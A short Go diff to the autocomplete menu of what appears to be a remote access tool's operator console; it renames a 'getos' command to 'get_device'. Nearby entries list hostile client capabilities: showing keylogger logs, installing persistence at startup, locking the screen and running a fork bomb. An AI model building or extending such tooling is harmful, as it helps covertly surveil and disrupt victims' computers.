@@ -36,7 +36,7 @@ func ClientCompleter(d prompt.Document) []prompt.Suggest {
 		{Text: "keylogger_show", Description: "Show Keylogger session logs"},
 		{Text: "persistence_enable", Description: "Install at Startup"},
 		{Text: "persistence_disable", Description: "Remove from Startup"},
-		{Text: "getos", Description: "Get OS name"},
+		{Text: "get_device", Description: "Get device information"},
 		{Text: "lockscreen", Description: "Lock the OS screen"},
 		{Text: "openurl", Description: "Open the URL informed"},
 		{Text: "bomb", Description: "Run Fork Bomb"},
